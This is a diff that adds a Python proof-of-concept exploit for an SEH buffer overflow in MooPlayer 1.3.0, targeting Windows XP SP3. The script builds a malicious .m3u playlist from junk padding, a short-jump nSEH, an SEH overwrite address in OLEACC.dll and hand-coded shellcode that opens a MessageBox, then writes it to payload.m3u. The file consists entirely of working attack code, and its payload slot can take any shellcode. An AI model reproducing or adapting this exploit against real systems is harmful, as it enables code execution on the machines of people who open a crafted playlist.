@@ -1,0 +1,40 @@
+#!/usr/bin/env python
+#################################################################
+# Exploit Title: MooPlayer 1.3.0 'm3u' SEH Buffer Overflow      #
+# Date Discovered: 10-02-2015                                   #
+# Author: dogo h@ck                                             #
+# Vulnerable Software: Moo player 1.3.0                         #
+# Software Link: https://mooplayer.jaleco.com/                  #
+# Version: 1.3.0                                                #
+# Tested On: Windows XP SP3                                     #
+#################################################################
+#BadCharacters = ("\x00\x0a\x0d")                               #
+#################################################################
+
+head="http://"
+buffer=10000
+junk = "\x41" * 264
+nseh = "\xeb\x06\x90\x90" 
+seh = "\xe2\x69\xc8\x74"  #74C869E2 OLEACC.dll || Path=C:\WINDOWS\system32\OLEACC.dll
+
+# Windows XP SP3 English MessageBoxA Shellcode
+
+shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
+"\x51\x68\x6c\x6c\x20\x20\x68\x33"
+"\x32\x2e\x64\x68\x75\x73\x65\x72"
+"\x89\xe1\xbb\x7b\x1d\x80\x7c\x51" # 0x7c801d7b ; LoadLibraryA(user32.dll)
+"\xff\xd3\xb9\x5e\x67\x30\xef\x81"
+"\xc1\x11\x11\x11\x11\x51\x68\x61"
+"\x67\x65\x42\x68\x4d\x65\x73\x73"
+"\x89\xe1\x51\x50\xbb\x40\xae\x80" # 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
+"\x7c\xff\xd3\x89\xe1\x31\xd2\x52"
+"\x51\x51\x52\xff\xd0\x31\xc0\x50"
+"\xb8\x12\xcb\x81\x7c\xff\xd0")
+
+poc = head + junk + nseh + seh + shellcode
+junk1 = "\x44"*(buffer-len(poc))
+poc += junk1
+file = "payload.m3u"
+f=open(file,"w")
+f.write(head + poc);
+f.close();
